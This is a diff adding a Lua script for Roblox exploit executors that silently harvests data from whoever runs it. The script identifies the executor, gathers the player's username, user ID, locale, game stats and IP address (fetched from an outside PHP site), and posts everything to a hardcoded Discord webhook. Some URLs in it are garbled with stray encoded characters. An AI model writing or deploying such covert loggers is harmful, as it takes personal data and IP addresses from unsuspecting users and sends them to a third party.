@@ -1,0 +1,35 @@
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Trash"
+
+local url =
+   "https://discord.com/api/webhooks/999295885643096164/LGOt72YEoHaEzbRmnZ3hwV73UcfQsrYvHqEro-XpCH8B9yhxn_1IiykmA9pOZDaht6FY"
+local data = {
+   ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
+   ["content"] = "",
+   ["embeds"] = {
+       {
+
+      ["author"] = {
+      ["name"] = "( Someone Executed The Script )",
+      ["url"] = "https://roblox.com/",
+    },
+
+           ["description"] = "\nPlayer Info".." \nDisplay Name: "..game.Players.LocalPlayer.DisplayName.." \nUsername: " .. game.Players.LocalPlayer.Name.." \nUser Id: "..game.Players.LocalPlayer.UserId.." \nLangue: "..game.LocalizationService.RobloxLocaleId.." \nExploit: "..webhookcheck.."\n\nGame Info".."\nGame: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.." \nGame Id: "..game.PlaceId.." \nWins: "..game:GetService("Players").LocalPlayer.leaderstats.Wins.Value.." \nCoins: "..game:GetService("Players").LocalPlayer.leaderstats.Coins.Value.."\n\nUser Info".."\nIP: "..game:HttpGet("https://piroves.gq/gusgus.php%22).."",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=%22..game.Players.LocalPlayer.UserId..%22&width=150&height=150&format=png%22%7D,
+            }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
